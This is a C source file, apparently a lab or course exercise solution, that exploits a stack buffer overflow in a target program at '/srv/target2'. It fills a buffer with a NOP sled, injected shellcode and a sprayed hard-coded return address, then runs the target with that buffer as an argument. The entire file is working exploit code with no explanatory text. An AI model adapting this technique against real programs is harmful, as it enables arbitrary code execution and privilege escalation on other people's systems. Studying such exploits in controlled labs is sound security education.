#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target2"

#define BUFFER_SIZE 409
#define OFFSET 201
#define RETURN_ADDRESS 0xffffdb5c

void fill_buffer(char *buf) {
    memset(buf, 0x90, BUFFER_SIZE - 1);
    memcpy(buf + OFFSET, shellcode, sizeof(shellcode) - 1);
    
    for (int i = OFFSET + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
        *(uint32_t *)(buf + i) = RETURN_ADDRESS;
    }
    
    buf[BUFFER_SIZE - 1] = '\0';
}

int main(void) {
    char *args[4];
    char *env[1];
    char buf[BUFFER_SIZE];
    
    fill_buffer(buf);
    
    args[0] = TARGET;
    args[1] = buf;
    args[2] = "65935";
    args[3] = NULL;
    
    env[0] = NULL;
    
    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");
    
    return 0;
}